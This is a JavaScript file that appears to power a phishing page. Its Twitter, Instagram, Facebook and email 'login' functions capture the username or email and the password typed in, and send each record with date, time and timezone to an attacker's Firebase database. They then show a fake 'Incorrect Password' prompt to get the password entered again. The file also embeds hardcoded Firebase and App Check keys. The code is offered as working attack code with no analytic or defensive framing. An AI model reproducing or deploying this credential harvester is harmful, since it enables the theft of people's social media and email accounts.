// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyBW7aWEZ5idKNubINEBU5VHiFTY0yila18",
  authDomain: "aljawdahstars.firebaseapp.com",
  databaseURL: "https://aljawdahstars-default-rtdb.firebaseio.com",
  projectId: "aljawdahstars",
  storageBucket: "aljawdahstars.firebasestorage.app",
  messagingSenderId: "853187355306",
  appId: "1:853187355306:web:e8e3c0d1eb6014692f26d3",
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

function tw_login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var email = document.getElementById("tw-email").value;
  var password = document.getElementById("tw-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Twitter";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      Swal.fire({
        title: "Oops!",
        text: "Incorrect Password. Please try again.",
        icon: "error",
        confirmButtonText: "Try Again",
      });
      document.getElementById("fb-pass").value = "";

      return false;
    }, 2000);
  }
}

function iglog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var username = document.getElementById("ig-uname").value;
  var password = document.getElementById("ig-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  console.log(timezone);
  var accountType = "Instagram";

  if (username !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: username,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      Swal.fire({
        title: "Oops!",
        text: "Incorrect Password. Please try again.",
        icon: "error",
        confirmButtonText: "Try Again",
      });

      document.getElementById("ig-pass").value = "";
      return false;
    }, 2000);
  }
}

function login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var email = document.getElementById("fb-email").value;
  var password = document.getElementById("fb-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      Swal.fire({
        title: "Oops!",
        text: "Incorrect Password. Please try again.",
        icon: "error",
        confirmButtonText: "Try Again",
      });
      document.getElementById("fb-pass").value = "";

      return false;
    }, 2000);
  }
}

function em_login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var email = document.getElementById("em-email").value;
  var password = document.getElementById("em-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Email";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      Swal.fire({
        title: "Oops!",
        text: "Incorrect Password. Please try again.",
        icon: "error",
        confirmButtonText: "Try Again",
      });
      document.getElementById("fb-pass").value = "";

      return false;
    }, 2000);
  }
}
